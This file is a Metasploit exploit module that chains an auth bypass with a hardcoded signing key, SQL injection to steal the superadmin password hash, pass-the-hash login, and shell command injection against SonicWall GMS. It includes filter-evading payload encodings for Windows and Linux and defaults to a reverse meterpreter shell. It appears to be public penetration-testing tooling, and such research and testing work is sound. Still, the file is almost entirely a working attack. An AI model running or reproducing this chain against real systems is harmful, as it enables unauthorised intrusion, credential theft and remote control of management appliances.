##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  # We can actually use the title to identify which platform we're on
  TITLE_WINDOWS = 'SonicWall Universal Management Host'
  TITLE_LINUX = 'SonicWall Universal Management Appliance'

  # Secret key (from com.sonicwall.ws.servlet.auth.MSWAuthenticator)
  SECRET_KEY = '?~!@#$%^^()'

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sonicwall',
        'Description' => %q{
          This module exploits a series of vulnerabilities - including auth
          bypass, SQL injection, and shell injection - to obtain remote code
          execution on SonicWall GMS versions <= 9.9.9320.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'fulmetalpackets <fulmetalpackets@gmail.com>', # MSF module, analysis
          'Ron Bowes <rbowes@rapid7.com>' # MSF module, original PoC, analysis
        ],
        'References' => [
          [ 'URL', 'https://www.rapid7.com/blog/post/2023/07/13/etr-sonicwall-recommends-urgent-patching-for-gms-and-analytics-cves/'],
          [ 'CVE', '2023-34124'],
          [ 'CVE', '2023-34133'],
          [ 'CVE', '2023-34132'],
          [ 'CVE', '2023-34127']
        ],
        'Privileged' => true,
        'Targets' => [
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_X64],
              'Type' => :dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                'WritableDir' => '/tmp',
                'DisablePayloadHandler' => false
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => ['win'],
              'Arch' => [ARCH_CMD],
              'Type' => :cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',
                'WritableDir' => '%TEMP%',
                'DisablePayloadHandler' => false
              }
            }
          ],
          [
            'Linux Command',
            {
              'Platform' => ['linux', 'unix'],
              'Arch' => [ARCH_CMD],
              'Type' => :cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/generic',
                'DisablePayloadHandler' => true
              }
            }
          ],
        ],
        'DefaultTarget' => 0,

        'DisclosureDate' => '2023-07-12',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        },
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => '443'
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The root URI of the Sonicwall appliance', '/']),
      ]
    )

    register_advanced_options([
      # This varies by target, so don't define the default here
      OptString.new('WritableDir', [true, 'A directory where we can write files']),
      OptBool.new('AllowIncorrectPlatform', [true, "Don't validate the platform before attempting the exploit", false])
    ])
  end

  def check
    vprint_status("Validating SonicWall GMS is running on URI: #{target_uri.path}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    )

    # Basic sanity checks - the path should return a HTTP/200
    return CheckCode::Unknown('Could not connect to web service - no response') if res.nil?
    return CheckCode::Unknown("Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

    # Ensure we're hitting plausible software
    return CheckCode::Detected("Running: #{::Regexp.last_match(1)}") if res.body =~ /(SonicWall Universal Management Suite .*)</

    # Otherwise, probably safe?
    CheckCode::Safe('Does not appear to be running SonicWall GMS')
  end

  # Exploits CVE-2023-34133 (SQL injection) + CVE-2023-34124 (auth bypass) to
  # get a password hash
  def get_password_hash
    # attempt a sqli.
    vprint_status('Attempting to use SQL injection to grab the password hash for the superadmin user...')

    # SQL injection question to fetch the admin password
    query = "' union select " +

            # This must be a valid DOMAIN, which we can thankfully fetch from the DB
            '(select ID from SGMSDB.DOMAINS limit 1), ' +

            # These fields don't matter
            "'', '', '', '', '', " +

            # This field is returned, so use it to get the id and password for our
            # the super user, if possible
            "(select concat(id, ':', password) from sgmsdb.users where active = '1' order by issuperadmin desc limit 1 offset 0)," +

            # The rest of the fields don't matter, end with a single quote to finish with a clean query
            "'', '', '"
    vprint_status("Generated SQL injection: #{query}")

    # We need to sign our query with the SECRET_KEY
    token = Base64.strict_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.const_get('SHA1').new, SECRET_KEY, query))
    vprint_status("Generated a token using built-in secret key: #{token}")

    # Build the URI
    # Note that encoding space to '+' doesn't work, so we replace it with '%20'
    uri = normalize_uri(target_uri.path, 'ws/msw/tenant', CGI.escape(query).gsub(/\+/, '%20'))

    # Do it!
    print_status('Sending SQL injection request to get the username/hash...')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => uri,
      'headers' => {
        'Auth' => '{"user": "system", "hash": "' + token + '"}',
        'Accept-Encoding' => 'gzip;q=1.0,deflate;q=0.6,identity;q=0.3',
        'Accept' => '*/*',
        'Connection' => 'close'
      }
    )

    # Sanity checks
    fail_with(Failure::Unreachable, 'Could not connect to web service - no response') if res.nil?
    fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}") if res.code != 200
    fail_with(Failure::UnexpectedReply, "Service didn't return a JSON response") if res.get_json_document.nil?

    # This field has the SQL injection response
    hash = res.get_json_document['alias']

    # If the server responds with an error, it has no 'alias' field so the key
    # is missing entirely (this is where it fails against patched targets)
    fail_with(Failure::NotVulnerable, "SQL injection failed - service probably isn't vulnerable (or isn't configured)") if hash.nil?

    # If alias is present but contains nothing, that means our query got no
    # results (probably there are no active users, or something?)
    fail_with(Failure::UnexpectedReply, 'SQL injection appeared to work, but no users returned - server might not have an admin account?') if hash.empty?

    # If there's no ':' in the response, something super weird happened
    fail_with(Failure::UnexpectedReply, 'SQL injection returned the wrong value: no username or hash') if !hash.include?(':')

    username, hash = hash.split(/:/, 2)
    print_good("Found an account: #{username}:#{hash}")

    [username, hash]
  end

  # Exploits CVE-2023-34132 (pass the hash)
  def authenticate(username, hash)
    # Grab server hashing token
    vprint_status('Grabbing server hashing token...')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/appliance/login'),
      'keep_cookies' => true
    )
    fail_with(Failure::Unreachable, 'Could not connect to web service - no response') if res.nil?

    # Look for the getPwdHash function call, as it contains the token we need
    if res.body.match(/getPwdHash.*,'([0-9]+)'/).nil?
      fail_with(Failure::UnexpectedReply, 'Could not get the server token for authentication')
    end

    server_token = ::Regexp.last_match(1)
    vprint_status("Got the server-side token: #{server_token}")

    # Generate the client_hash by combining the server token + the stolen
    # password hash
    client_hash = Digest::MD5.hexdigest(server_token + hash)
    vprint_status("Generated client token: #{client_hash}")

    # Send the token
    print_status('Attempting to authenticate with the client token + password hash...')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/appliance/applianceMainPage'),
      'keep_cookies' => true,
      'vars_post' => {
        'action' => 'login',
        'skipSessionCheck' => '0',
        'needPwdChange' => '0',
        'clientHash' => client_hash,
        'password' => hash,
        'applianceUser' => username,
        'appliancePassword' => 'Nice Try',
        'ctlTimezoneOffset' => '0'
      }
    })

    fail_with(Failure::Unreachable, 'Could not connect to web service - no response') if res.nil?

    # Check the title to make sure it worked
    html = res.get_html_document
    title = html.at('title').text

    # We can identify the platform based on the title
    if title == TITLE_LINUX
      print_good("Successfully logged in as #{username} (Linux detected!)")
      return Msf::Module::Platform::Linux
    elsif title == TITLE_WINDOWS
      print_good("Successfully logged in as #{username} (Windows detected!)")
      return Msf::Module::Platform::Windows
    end

    fail_with(Failure::UnexpectedReply, "Authentication appears to have failed! Title was \"#{title}\", which is not recognized as successful")
  end

  def execute_command_windows(cmd)
    vprint_status("Encoding (Windows) command: #{cmd}")

    # While this is a shell command injection issue, an aggressive XSS filter
    # prevents us from using a lot of important characters such as quotes and
    # plus and ampersands and stuff. We can't even use Base64, because we can't
    # use the + sign!
    #
    # We discovered that we could encode the command as integers, then use
    # powershell to decode + execute it, so that's what this does.
    cmd = "cmd.exe /c #{Msf::Post::Windows.escape_powershell_literal(cmd).gsub(/&/, '"&"')}"
    cmd = "powershell IEX ([System.Text.Encoding]::UTF8.GetString([byte[]]@(#{cmd.bytes.join(',')})))"

    # Run the command
    vprint_status("Running shell command: #{cmd}")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/appliance/applianceMainPage'),
      'keep_cookies' => true,
      'vars_post' => {
        'num' => '3232150',
        'action' => 'file_system',
        'task' => 'search',
        'item' => 'application_log',
        'criteria' => '*',
        'width' => '500',
        'searchFolder' => 'C:\\GMSVP\\etc\\',
        'searchFilter' => "appliance.jar|#{cmd}| echo "
      }
    })

    # This doesn't work, because our payload blocks and it eventually fails
    fail_with(Failure::Unreachable, 'No response to command execution') if res.nil? || res.body.nil?
    fail_with(Failure::UnexpectedReply, 'The server rejected our command due to filtering (the service has very aggressive XSS filtering, which blocks a lot of shell commands)') if res&.body&.include?('invalid contents found')

    print_good('Payload sent!')
  end

  def execute_command_linux(cmd)
    vprint_status('Encoding (Linux) payload')

    # Generate a filename
    payload_file = File.join(datastore['WritableDir'], ".#{Rex::Text.rand_text_alpha_lower(8)}")

    # Wrap the command so we can execute arbitrary commands. There are several
    # difficulties here, the first of which is that we don't have much in the
    # way of tools. We're missing curl, wget, base64, python, ruby, even perl!
    # The best tool I could find for staging a payload is uudecode, so we use
    # that. (I noticed later that telnet exists, which could be another option)
    #
    # The good news is, with uudecode, we can send a base64 payload. The bad
    # news is, we can't use '+', which means we can't use pure base64! To work
    # around that, we replace '+' with '@', then use a bit of Bash magic to
    # put it back! We also can't use quotes, so we have to do a mountain of
    # escaping instead. The default shell is also /bin/sh, so we need to run
    # bash explicitly for the `$()` substitutions to work.
    #
    # The summary is:
    # * Use bash so we have access to $() (we can't use backticks)
    # * Use uudecode to get a + into the $PLUS variable (using base64)
    # * Generate a base64 payload, but replace + with ${PLUS} to bypass filter
    # * Decode the payload into our payload file
    # * Run the payload in the background with coproc
    # * Delete the payload file
    cmd = "bash -c #{Shellwords.escape("PLUS=$(echo -e begin-base64\ 755\ a\\\\nKwee\\\\n==== | uudecode -o-);echo -e begin-base64 755 #{Shellwords.escape(payload_file)}\\\\n#{Base64.strict_encode64(cmd).gsub(/\+/, '${PLUS}')}\\\\n==== | uudecode ; coproc #{Shellwords.escape(payload_file)} ; rm #{payload_file}")}"

    # Run it!
    vprint_status("Encoded shell command: #{cmd}")
    print_status('Attempting to execute the shell injection payload')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/appliance/applianceMainPage'),
      'keep_cookies' => true,
      'vars_post' => {
        'num' => '3232150',
        'action' => 'file_system',
        'task' => 'search',
        'item' => 'application_log',
        'criteria' => '*',
        'width' => '500',
        'searchFolder' => '/opt/GMSVP/etc/',
        'searchFilter' => "appliance.jar;#{cmd};echo "
      }
    })

    # This doesn't work, because our payload blocks and it eventually fails
    fail_with(Failure::Unreachable, 'No response to command execution') if res.nil? || res.body.nil?
    fail_with(Failure::UnexpectedReply, 'The server rejected our command due to filtering (the service has very aggressive XSS filtering, which blocks a lot of shell commands)') if res&.body&.include?('invalid contents found')

    print_good('Payload sent!')
  end

  def exploit
    # Get the password hash (from SQL injection + auth bypass)
    username, hash = get_password_hash

    # Use pass-the-hash to log in using that hash
    detected_platform = authenticate(username, hash)

    # Sanity-check the target
    if !datastore['AllowIncorrectPlatform'] && !target.platform.platforms.include?(detected_platform)
      fail_with(Failure::BadConfig, "The host appears to be #{detected_platform}, which the target #{target.name} does not support; please choose the appropriate target (or set AllowIncorrectPlatform to true)")
    end

    # Generate a payload based on the target type
    case target['Type']
    when :cmd
      my_payload = payload.encoded
    when :dropper
      my_payload = generate_payload_exe(code: payload.encoded)
    else
      fail_with(Failure::BadConfig, "Unknown target type: #{target.type}")
    end

    # Run a command, using the platform specified in the target
    if target.platform.platforms.include?(Msf::Module::Platform::Linux)
      execute_command_linux(my_payload)
    elsif target.platform.platforms.include?(Msf::Module::Platform::Windows)
      execute_command_windows(my_payload)
    else
      fail_with(Failure::Unknown, "Unknown platform: #{platform}")
    end
  end
end
